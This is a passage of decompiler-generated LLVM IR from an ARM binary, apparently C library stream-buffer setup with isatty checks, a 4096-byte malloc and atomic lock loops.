  %v8_147e4 = icmp eq i32 %v3_147d4, 2147483647
  %v1_147e8 = trunc i32 %v2_147e0 to i16
  store i16 %v1_147e8, i16* %v1_147b4, align 2
  br i1 %v8_147e4, label %dec_label_pc_14828, label %dec_label_pc_147f0

dec_label_pc_147f0:                               ; preds = %bb55
  store i32 ptrtoint (i32* @global_var_c54c.853 to i32), i32* %r3.global-to-local, align 4
  %v0_147f4 = call i32 @__aeabi_read_tp()
  %v3_147f8 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_147f8 = sext i16 %v3_147f8 to i32
  store i32 %v4_147f8, i32* @r3, align 4
  store i32 %v0_147f4, i32* @r6, align 4
  %v0_14800 = load i32, i32* @r4, align 4
  store i32 %v0_14800, i32* @r0, align 4
  %v2_14804 = add i32 %v4_147f8, %v0_147f4
  %v3_14804 = inttoptr i32 %v2_14804 to i32*
  %v4_14804 = load i32, i32* %v3_14804, align 4
  store i32 %v4_14804, i32* @r4, align 4
  %v1_14808 = call i32 @isatty(i32 %v0_14800)
  store i32 %v1_14808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1480c = icmp eq i32 %v1_14808, 0
  br i1 %v2_1480c, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_147f0
  %v1_14810 = load i32, i32* @r5, align 4
  %v2_14810 = inttoptr i32 %v1_14810 to i16*
  %v3_14810 = load i16, i16* %v2_14810, align 2
  %v4_14810 = zext i16 %v3_14810 to i32
  %v2_14814 = or i32 %v4_14810, 256
  store i32 %v2_14814, i32* %r3.global-to-local, align 4
  %v2_14818 = trunc i32 %v2_14814 to i16
  store i16 %v2_14818, i16* %v2_14810, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_147f0, %bb56
  %v3_14820 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_14820 = sext i16 %v3_14820 to i32
  store i32 %v4_14820, i32* %r3.global-to-local, align 4
  %v0_14824 = load i32, i32* @r4, align 4
  %v1_14824 = load i32, i32* @r6, align 4
  %v3_14824 = add i32 %v1_14824, %v4_14820
  %v4_14824 = inttoptr i32 %v3_14824 to i32*
  store i32 %v0_14824, i32* %v4_14824, align 4
  br label %dec_label_pc_14828

dec_label_pc_14828:                               ; preds = %bb55, %.thread5
  %v0_14828 = load i32, i32* @r5, align 4
  %v1_14828 = add i32 %v0_14828, 8
  %v2_14828 = inttoptr i32 %v1_14828 to i32*
  %v3_14828 = load i32, i32* %v2_14828, align 4
  store i32 %v3_14828, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1482c = icmp eq i32 %v3_14828, 0
  br i1 %v2_1482c, label %dec_label_pc_14834, label %bb57

dec_label_pc_14834:                               ; preds = %dec_label_pc_14828
  store i32 4096, i32* @r0, align 4
  %v0_14838 = call i32 @malloc()
  store i32 %v0_14838, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1483c = icmp eq i32 %v0_14838, 0
  %v1_1484c.pre = load i32, i32* @r5, align 4
  br i1 %v2_1483c, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14834
  %v2_14840 = inttoptr i32 %v1_1484c.pre to i16*
  %v3_14840 = load i16, i16* %v2_14840, align 2
  %v4_14840 = zext i16 %v3_14840 to i32
  %v2_14844 = add i32 %v0_14838, 4096
  store i32 %v2_14844, i32* %r2.global-to-local, align 4
  %v2_14848 = or i32 %v4_14840, 16384
  store i32 %v2_14848, i32* %r3.global-to-local, align 4
  %v2_1484c = add i32 %v1_1484c.pre, 8
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v0_14838, i32* %v3_1484c, align 4
  %v1_14850 = load i32, i32* %r2.global-to-local, align 4
  %v2_14850 = load i32, i32* @r5, align 4
  %v3_14850 = add i32 %v2_14850, 12
  %v4_14850 = inttoptr i32 %v3_14850 to i32*
  store i32 %v1_14850, i32* %v4_14850, align 4
  %v1_14854 = load i32, i32* %r3.global-to-local, align 4
  %v2_14854 = trunc i32 %v1_14854 to i16
  %v3_14854 = load i32, i32* @r5, align 4
  %v4_14854 = inttoptr i32 %v3_14854 to i16*
  store i16 %v2_14854, i16* %v4_14854, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_14834
  %v2_1484c37 = add i32 %v1_1484c.pre, 8
  %v3_1484c38 = inttoptr i32 %v2_1484c37 to i32*
  store i32 0, i32* %v3_1484c38, align 4
  %v2_14858 = load i32, i32* @r5, align 4
  %v3_14858 = add i32 %v2_14858, 12
  %v4_14858 = inttoptr i32 %v3_14858 to i32*
  store i32 0, i32* %v4_14858, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_14828, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_14864 = load i32, i32* @r8, align 4
  %v2_14864 = add i32 %v0_14864, 92
  %v3_14864 = inttoptr i32 %v2_14864 to i32*
  %v4_14864 = load i32, i32* %v3_14864, align 4
  store i32 %v4_14864, i32* %r3.global-to-local, align 4
  %v2_14868 = load i32, i32* @r5, align 4
  %v3_14868 = add i32 %v2_14868, 2
  %v4_14868 = inttoptr i32 %v3_14868 to i8*
  store i8 0, i8* %v4_14868, align 1
  %v0_1486c = load i32, i32* @r5, align 4
  %v1_1486c = inttoptr i32 %v0_1486c to i16*
  %v2_1486c = load i16, i16* %v1_1486c, align 2
  %v3_1486c = zext i16 %v2_1486c to i32
  store i32 %v3_1486c, i32* %r2.global-to-local, align 4
  %v0_14870 = load i32, i32* %r3.global-to-local, align 4
  %v1_14870 = inttoptr i32 %v0_14870 to i32*
  %v2_14870 = load i32, i32* %v1_14870, align 4
  store i32 %v2_14870, i32* @r1, align 4
  %v1_14874 = add i32 %v0_1486c, 8
  %v2_14874 = inttoptr i32 %v1_14874 to i32*
  %v3_14874 = load i32, i32* %v2_14874, align 4
  store i32 %v3_14874, i32* %r3.global-to-local, align 4
  %v1_14878 = and i32 %v3_1486c, 8192
  %v2_14878 = icmp eq i32 %v1_14878, 0
  %v2_1487c = add i32 %v0_1486c, 20
  %v3_1487c = inttoptr i32 %v2_1487c to i32*
  store i32 %v3_14874, i32* %v3_1487c, align 4
  %v0_14880 = load i32, i32* @r1, align 4
  %v1_14880 = load i32, i32* @r5, align 4
  %v2_14880 = add i32 %v1_14880, 52
  %v3_14880 = inttoptr i32 %v2_14880 to i32*
  store i32 %v0_14880, i32* %v3_14880, align 4
  %v0_14884 = load i32, i32* %r3.global-to-local, align 4
  %v1_14884 = load i32, i32* @r5, align 4
  %v2_14884 = add i32 %v1_14884, 24
  %v3_14884 = inttoptr i32 %v2_14884 to i32*
  store i32 %v0_14884, i32* %v3_14884, align 4
  %v0_14888 = load i32, i32* %r3.global-to-local, align 4
  %v1_14888 = load i32, i32* @r5, align 4
  %v2_14888 = add i32 %v1_14888, 28
  %v3_14888 = inttoptr i32 %v2_14888 to i32*
  store i32 %v0_14888, i32* %v3_14888, align 4
  %v0_1488c = load i32, i32* %r3.global-to-local, align 4
  %v1_1488c = load i32, i32* @r5, align 4
  %v2_1488c = add i32 %v1_1488c, 16
  %v3_1488c = inttoptr i32 %v2_1488c to i32*
  store i32 %v0_1488c, i32* %v3_1488c, align 4
  %v0_14890 = load i32, i32* %r4.global-to-local, align 4
  %v1_14890 = load i32, i32* @r5, align 4
  %v2_14890 = add i32 %v1_14890, 44
  %v3_14890 = inttoptr i32 %v2_14890 to i32*
  store i32 %v0_14890, i32* %v3_14890, align 4
  br i1 %v2_14878, label %dec_label_pc_14a78, label %dec_label_pc_14898

dec_label_pc_14898:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1489c = load i32, i32* @r8, align 4
  %v2_1489c = add i32 %v0_1489c, 160
  %v3_1489c = inttoptr i32 %v2_1489c to i32*
  %v4_1489c = load i32, i32* %v3_1489c, align 4
  store i32 %v4_1489c, i32* %r7.global-to-local, align 4
  %v0_148a0 = call i32 @__aeabi_read_tp()
  store i32 %v0_148a0, i32* %r0.global-to-local, align 4
  %v1_148a4 = add i32 %v4_1489c, 8
  %v2_148a4 = inttoptr i32 %v1_148a4 to i32*
  %v3_148a4 = load i32, i32* %v2_148a4, align 4
  store i32 %v3_148a4, i32* %r3.global-to-local, align 4
  %v1_148a8 = add i32 %v0_148a0, -1168
  store i32 %v1_148a8, i32* %r6.global-to-local, align 4
  %v3_148ac = icmp uge i32 %v3_148a4, %v1_148a8
  store i1 %v3_148ac, i1* %cpsr_c.global-to-local, align 1
  %v9_148ac = icmp eq i32 %v3_148a4, %v1_148a8
  br i1 %v9_148ac, label %dec_label_pc_148f0, label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_14898
  store i32 %v4_1489c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148bc

dec_label_pc_148bc:                               ; preds = %dec_label_pc_148c8.dec_label_pc_148bc_crit_edge, %dec_label_pc_148b4
  %v0_148bc = phi i32 [ %v0_148bc.pre, %dec_label_pc_148c8.dec_label_pc_148bc_crit_edge ], [ %v4_1489c, %dec_label_pc_148b4 ]
  %v1_148bc = inttoptr i32 %v0_148bc to i32*
  %v2_148bc = load i32, i32* %v1_148bc, align 4
  store i32 %v2_148bc, i32* %r3.global-to-local, align 4
  %v1_148c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_148c0 = icmp uge i32 %v2_148bc, %v1_148c0
  store i1 %v3_148c0, i1* %cpsr_c.global-to-local, align 1
  %v9_148c0 = icmp eq i32 %v2_148bc, %v1_148c0
  br i1 %v9_148c0, label %dec_label_pc_148c8, label %dec_label_pc_148e0

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148bc
  store i32 %v2_148bc, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_148d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_148d8, label %dec_label_pc_148dc, label %dec_label_pc_148c8.dec_label_pc_148bc_crit_edge

dec_label_pc_148c8.dec_label_pc_148bc_crit_edge:  ; preds = %dec_label_pc_148c8
  %v0_148bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_148bc

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148c8
  %v0_148dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_148e0

dec_label_pc_148e0:                               ; preds = %dec_label_pc_148bc, %dec_label_pc_148dc
  %v0_148e0 = phi i32 [ %v0_148dc, %dec_label_pc_148dc ], [ %v2_148bc, %dec_label_pc_148bc ]
  %v1_148e0 = phi i32 [ %v0_148dc, %dec_label_pc_148dc ], [ %v1_148c0, %dec_label_pc_148bc ]
  %v3_148e0 = icmp uge i32 %v0_148e0, %v1_148e0
  store i1 %v3_148e0, i1* %cpsr_c.global-to-local, align 1
  %v9_148e0 = icmp eq i32 %v0_148e0, %v1_148e0
  br i1 %v9_148e0, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_148e0
  %v1_148e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_148e4, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_148e0, %bb58
  %v1_148e8 = xor i1 %v9_148e0, true
  call void @__pseudo_cond_branch(i1 %v1_148e8, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_148ec = load i32, i32* %r6.global-to-local, align 4
  %v1_148ec = load i32, i32* %r7.global-to-local, align 4
  %v2_148ec = add i32 %v1_148ec, 8
  %v3_148ec = inttoptr i32 %v2_148ec to i32*
  store i32 %v0_148ec, i32* %v3_148ec, align 4
  %v1_1490c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_14898, %bb59
  %v1_1490c = phi i32 [ %v3_148a4, %dec_label_pc_14898 ], [ %v1_1490c.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_148f4 = load i32, i32* @r8, align 4
  %v2_148f4 = add i32 %v0_148f4, 160
  %v3_148f4 = inttoptr i32 %v2_148f4 to i32*
  %v4_148f4 = load i32, i32* %v3_148f4, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_148fc = add i32 %v0_148f4, 152
  %v3_148fc = inttoptr i32 %v2_148fc to i32*
  %v4_148fc = load i32, i32* %v3_148fc, align 4
  store i32 %v4_148fc, i32* %r7.global-to-local, align 4
  %v1_14900 = add i32 %v4_148f4, 4
  %v2_14900 = inttoptr i32 %v1_14900 to i32*
  %v3_14900 = load i32, i32* %v2_14900, align 4
  store i32 %v3_14900, i32* %r3.global-to-local, align 4
  %v1_14904 = add i32 %v4_148fc, 8
  %v2_14904 = inttoptr i32 %v1_14904 to i32*
  %v3_14904 = load i32, i32* %v2_14904, align 4
  store i32 %v3_14904, i32* %r2.global-to-local, align 4
  %v1_14908 = add i32 %v3_14900, 1
  store i32 %v1_14908, i32* %r3.global-to-local, align 4
  %v3_1490c = icmp uge i32 %v3_14904, %v1_1490c
  store i1 %v3_1490c, i1* %cpsr_c.global-to-local, align 1
  %v9_1490c = icmp eq i32 %v3_14904, %v1_1490c
  store i32 %v1_14908, i32* %v2_14900, align 4
  br i1 %v9_1490c, label %dec_label_pc_14958, label %dec_label_pc_14918

dec_label_pc_14918:                               ; preds = %dec_label_pc_148f0
  %v0_1491c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1491c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1492495 = inttoptr i32 %v0_1491c to i32*
  %v2_1492496 = load i32, i32* %v1_1492495, align 4
  store i32 %v2_1492496, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1492898 = icmp eq i32 %v2_1492496, 0
  br i1 %v9_1492898, label %dec_label_pc_14930, label %dec_label_pc_14948

dec_label_pc_14930:                               ; preds = %dec_label_pc_14918, %dec_label_pc_14930.dec_label_pc_14924_crit_edge
  %v0_1493099 = phi i32 [ %v1_14928.pre, %dec_label_pc_14930.dec_label_pc_14924_crit_edge ], [ 0, %dec_label_pc_14918 ]
  store i32 %v0_1493099, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14940 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14940, label %dec_label_pc_14944, label %dec_label_pc_14930.dec_label_pc_14924_crit_edge

dec_label_pc_14930.dec_label_pc_14924_crit_edge:  ; preds = %dec_label_pc_14930
  %v0_14924.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14928.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14924 = inttoptr i32 %v0_14924.pre to i32*
  %v2_14924 = load i32, i32* %v1_14924, align 4
  store i32 %v2_14924, i32* %r3.global-to-local, align 4
  %v3_14928 = icmp uge i32 %v2_14924, %v1_14928.pre
  store i1 %v3_14928, i1* %cpsr_c.global-to-local, align 1
  %v9_14928 = icmp eq i32 %v2_14924, %v1_14928.pre
  br i1 %v9_14928, label %dec_label_pc_14930, label %dec_label_pc_14948

dec_label_pc_14944:                               ; preds = %dec_label_pc_14930
  %v0_14944 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14944, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %dec_label_pc_14918, %dec_label_pc_14930.dec_label_pc_14924_crit_edge, %dec_label_pc_14944
  %v0_14948 = phi i32 [ %v0_14944, %dec_label_pc_14944 ], [ %v2_1492496, %dec_label_pc_14918 ], [ %v2_14924, %dec_label_pc_14930.dec_label_pc_14924_crit_edge ]
  %v1_14948 = phi i32 [ %v0_14944, %dec_label_pc_14944 ], [ 0, %dec_label_pc_14918 ], [ %v1_14928.pre, %dec_label_pc_14930.dec_label_pc_14924_crit_edge ]
  %v3_14948 = icmp uge i32 %v0_14948, %v1_14948
  store i1 %v3_14948, i1* %cpsr_c.global-to-local, align 1
  %v9_14948 = icmp eq i32 %v0_14948, %v1_14948
  br i1 %v9_14948, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_14948
  %v1_1494c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1494c, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_14948, %bb60
  %v1_14950 = xor i1 %v9_14948, true
  call void @__pseudo_cond_branch(i1 %v1_14950, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_14954 = load i32, i32* %r6.global-to-local, align 4
  %v1_14954 = load i32, i32* %r7.global-to-local, align 4
  %v2_14954 = add i32 %v1_14954, 8
  %v3_14954 = inttoptr i32 %v2_14954 to i32*
  store i32 %v0_14954, i32* %v3_14954, align 4
  br label %dec_label_pc_14958

dec_label_pc_14958:                               ; preds = %dec_label_pc_148f0, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_1495c = load i32, i32* @r8, align 4
  %v2_1495c = add i32 %v0_1495c, 152
  %v3_1495c = inttoptr i32 %v2_1495c to i32*
  %v4_1495c = load i32, i32* %v3_1495c, align 4
  store i32 %v4_1495c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_14964 = add i32 %v0_1495c, 76
  %v3_14964 = inttoptr i32 %v2_14964 to i32*
  %v4_14964 = load i32, i32* %v3_14964, align 4
  store i32 %v4_14964, i32* @r1, align 4
  %v1_14968 = add i32 %v4_1495c, 4
  %v2_14968 = inttoptr i32 %v1_14968 to i32*
  %v3_14968 = load i32, i32* %v2_14968, align 4
  store i32 %v3_14968, i32* %r3.global-to-local, align 4
  %v1_1496c = inttoptr i32 %v4_14964 to i32*
  %v2_1496c = load i32, i32* %v1_1496c, align 4
  store i32 %v2_1496c, i32* %r2.global-to-local, align 4
  %v1_14970 = add i32 %v3_14968, 1
  store i32 %v1_14970, i32* %r3.global-to-local, align 4
  store i32 %v1_14970, i32* %v2_14968, align 4
  %v0_14978 = load i32, i32* %r2.global-to-local, align 4
  %v1_14978 = load i32, i32* @r5, align 4
  %v2_14978 = add i32 %v1_14978, 32
  %v3_14978 = inttoptr i32 %v2_14978 to i32*
  store i32 %v0_14978, i32* %v3_14978, align 4
  %v0_1497c = load i32, i32* %r0.global-to-local, align 4
  %v1_1497c = add i32 %v0_1497c, 4
  %v2_1497c = inttoptr i32 %v1_1497c to i32*
  %v3_1497c = load i32, i32* %v2_1497c, align 4
  %v1_14980 = add i32 %v3_1497c, -1
  store i32 %v1_14980, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14984 = icmp eq i32 %v1_14980, 0
  %v0_14988 = load i32, i32* @r5, align 4
  %v1_14988 = load i32, i32* @r1, align 4
  %v2_14988 = inttoptr i32 %v1_14988 to i32*
  store i32 %v0_14988, i32* %v2_14988, align 4
  %v0_1498c = load i32, i32* %r3.global-to-local, align 4
  %v1_1498c = load i32, i32* %r0.global-to-local, align 4
  %v2_1498c = add i32 %v1_1498c, 4
  %v3_1498c = inttoptr i32 %v2_1498c to i32*
  store i32 %v0_1498c, i32* %v3_1498c, align 4
  br i1 %v2_14984, label %dec_label_pc_14994, label %dec_label_pc_149f4

dec_label_pc_14994:                               ; preds = %dec_label_pc_14958
  %v0_14994 = load i32, i32* %r3.global-to-local, align 4
  %v1_14994 = load i32, i32* %r0.global-to-local, align 4
  %v2_14994 = add i32 %v1_14994, 8
  %v3_14994 = inttoptr i32 %v2_14994 to i32*
  store i32 %v0_14994, i32* %v3_14994, align 4
  %v0_14998 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14998, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %dec_label_pc_149cc.dec_label_pc_1499c_crit_edge, %dec_label_pc_14994
  %v0_1499c = phi i32 [ %v0_1499c.pre, %dec_label_pc_149cc.dec_label_pc_1499c_crit_edge ], [ %v0_14998, %dec_label_pc_14994 ]
  %v1_1499c = inttoptr i32 %v0_1499c to i32*
  %v2_1499c = load i32, i32* %v1_1499c, align 4
  store i32 %v2_1499c, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1499c, i32* %r2.global-to-local, align 4
  %v2_149a883 = load i32, i32* %v1_1499c, align 4
  store i32 %v2_149a883, i32* %r3.global-to-local, align 4
  %v3_149ac85 = icmp uge i32 %v2_149a883, %v2_1499c
  store i1 %v3_149ac85, i1* %cpsr_c.global-to-local, align 1
  %v9_149ac91 = icmp eq i32 %v2_149a883, %v2_1499c
  br i1 %v9_149ac91, label %dec_label_pc_149b4, label %dec_label_pc_149cc

dec_label_pc_149b4:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge
  %v0_149b492 = phi i32 [ %v1_149ac.pre, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge ], [ %v2_1499c, %dec_label_pc_1499c ]
  store i32 %v0_149b492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_149c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149c4, label %dec_label_pc_149c8, label %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge

dec_label_pc_149b4.dec_label_pc_149a8_crit_edge:  ; preds = %dec_label_pc_149b4
  %v0_149a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_149a8 = inttoptr i32 %v0_149a8.pre to i32*
  %v2_149a8 = load i32, i32* %v1_149a8, align 4
  store i32 %v2_149a8, i32* %r3.global-to-local, align 4
  %v3_149ac = icmp uge i32 %v2_149a8, %v1_149ac.pre
  store i1 %v3_149ac, i1* %cpsr_c.global-to-local, align 1
  %v9_149ac = icmp eq i32 %v2_149a8, %v1_149ac.pre
  br i1 %v9_149ac, label %dec_label_pc_149b4, label %dec_label_pc_149cc

dec_label_pc_149c8:                               ; preds = %dec_label_pc_149b4
  %v0_149c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_149c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge, %dec_label_pc_149c8
  %v0_149d4 = phi i32 [ %v0_149c8, %dec_label_pc_149c8 ], [ %v2_149a883, %dec_label_pc_1499c ], [ %v2_149a8, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge ]
  %v1_149cc = phi i32 [ %v0_149c8, %dec_label_pc_149c8 ], [ %v2_1499c, %dec_label_pc_1499c ], [ %v1_149ac.pre, %dec_label_pc_149b4.dec_label_pc_149a8_crit_edge ]
  %v3_149cc = icmp uge i32 %v0_149d4, %v1_149cc
  store i1 %v3_149cc, i1* %cpsr_c.global-to-local, align 1
  %v9_149cc = icmp eq i32 %v0_149d4, %v1_149cc
  br i1 %v9_149cc, label %dec_label_pc_149d4, label %dec_label_pc_149cc.dec_label_pc_1499c_crit_edge

dec_label_pc_149cc.dec_label_pc_1499c_crit_edge:  ; preds = %dec_label_pc_149cc
  %v0_1499c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_149d4:                               ; preds = %dec_label_pc_149cc
  %v2_149d4 = icmp ne i32 %v1_149cc, 0
  store i1 %v2_149d4, i1* %cpsr_c.global-to-local, align 1
  %v7_149d8 = icmp slt i32 %v1_149cc, 2
  br i1 %v7_149d8, label %dec_label_pc_149f4, label %dec_label_pc_149dc

dec_label_pc_149dc:                               ; preds = %dec_label_pc_149d4
  %v0_149dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_149dc, i32* %r0.global-to-local, align 4
  %v0_149e0 = load i32, i32* @r1, align 4
  %v1_149e0 = add i32 %v0_149e0, 129
  store i32 %v1_149e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_149f4

dec_label_pc_149f4:                               ; preds = %dec_label_pc_14958, %dec_label_pc_149dc, %dec_label_pc_149d4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_149f8 = load i32, i32* @r8, align 4
  %v2_149f8 = add i32 %v0_149f8, 160
  %v3_149f8 = inttoptr i32 %v2_149f8 to i32*
  %v4_149f8 = load i32, i32* %v3_149f8, align 4
  store i32 %v4_149f8, i32* %r0.global-to-local, align 4
  %v1_149fc = add i32 %v4_149f8, 4
  %v2_149fc = inttoptr i32 %v1_149fc to i32*
  %v3_149fc = load i32, i32* %v2_149fc, align 4
  %v1_14a00 = add i32 %v3_149fc, -1
  store i32 %v1_14a00, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a04 = icmp eq i32 %v1_14a00, 0
  store i32 %v1_14a00, i32* %v2_149fc, align 4
  br i1 %v2_14a04, label %dec_label_pc_14a10, label %dec_label_pc_14a78

dec_label_pc_14a10:                               ; preds = %dec_label_pc_149f4
  %v0_14a10 = load i32, i32* %r3.global-to-local, align 4
  %v1_14a10 = load i32, i32* %r0.global-to-local, align 4
  %v2_14a10 = add i32 %v1_14a10, 8
  %v3_14a10 = inttoptr i32 %v2_14a10 to i32*
  store i32 %v0_14a10, i32* %v3_14a10, align 4
  %v0_14a14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14a14, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a18

dec_label_pc_14a18:                               ; preds = %dec_label_pc_14a48.dec_label_pc_14a18_crit_edge, %dec_label_pc_14a10
  %v0_14a18 = phi i32 [ %v0_14a18.pre, %dec_label_pc_14a48.dec_label_pc_14a18_crit_edge ], [ %v0_14a14, %dec_label_pc_14a10 ]
  %v1_14a18 = inttoptr i32 %v0_14a18 to i32*
  %v2_14a18 = load i32, i32* %v1_14a18, align 4
  store i32 %v2_14a18, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_14a18, i32* %r2.global-to-local, align 4
  %v2_14a2471 = load i32, i32* %v1_14a18, align 4
  store i32 %v2_14a2471, i32* %r3.global-to-local, align 4
  %v3_14a2873 = icmp uge i32 %v2_14a2471, %v2_14a18
  store i1 %v3_14a2873, i1* %cpsr_c.global-to-local, align 1
  %v9_14a2879 = icmp eq i32 %v2_14a2471, %v2_14a18
  br i1 %v9_14a2879, label %dec_label_pc_14a30, label %dec_label_pc_14a48

dec_label_pc_14a30:                               ; preds = %dec_label_pc_14a18, %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge
  %v0_14a3080 = phi i32 [ %v1_14a28.pre, %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge ], [ %v2_14a18, %dec_label_pc_14a18 ]
  store i32 %v0_14a3080, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14a40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a40, label %dec_label_pc_14a44, label %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge

dec_label_pc_14a30.dec_label_pc_14a24_crit_edge:  ; preds = %dec_label_pc_14a30
  %v0_14a24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14a28.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a24 = inttoptr i32 %v0_14a24.pre to i32*
  %v2_14a24 = load i32, i32* %v1_14a24, align 4
  store i32 %v2_14a24, i32* %r3.global-to-local, align 4
  %v3_14a28 = icmp uge i32 %v2_14a24, %v1_14a28.pre
  store i1 %v3_14a28, i1* %cpsr_c.global-to-local, align 1
  %v9_14a28 = icmp eq i32 %v2_14a24, %v1_14a28.pre
  br i1 %v9_14a28, label %dec_label_pc_14a30, label %dec_label_pc_14a48

dec_label_pc_14a44:                               ; preds = %dec_label_pc_14a30
  %v0_14a44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a48

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a18, %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge, %dec_label_pc_14a44
  %v0_14a50 = phi i32 [ %v0_14a44, %dec_label_pc_14a44 ], [ %v2_14a2471, %dec_label_pc_14a18 ], [ %v2_14a24, %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge ]
  %v1_14a48 = phi i32 [ %v0_14a44, %dec_label_pc_14a44 ], [ %v2_14a18, %dec_label_pc_14a18 ], [ %v1_14a28.pre, %dec_label_pc_14a30.dec_label_pc_14a24_crit_edge ]
  %v3_14a48 = icmp uge i32 %v0_14a50, %v1_14a48
  store i1 %v3_14a48, i1* %cpsr_c.global-to-local, align 1
  %v9_14a48 = icmp eq i32 %v0_14a50, %v1_14a48
  br i1 %v9_14a48, label %dec_label_pc_14a50, label %dec_label_pc_14a48.dec_label_pc_14a18_crit_edge

dec_label_pc_14a48.dec_label_pc_14a18_crit_edge:  ; preds = %dec_label_pc_14a48
  %v0_14a18.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a18

dec_label_pc_14a50:                               ; preds = %dec_label_pc_14a48
  %v2_14a50 = icmp ne i32 %v1_14a48, 0
  store i1 %v2_14a50, i1* %cpsr_c.global-to-local, align 1
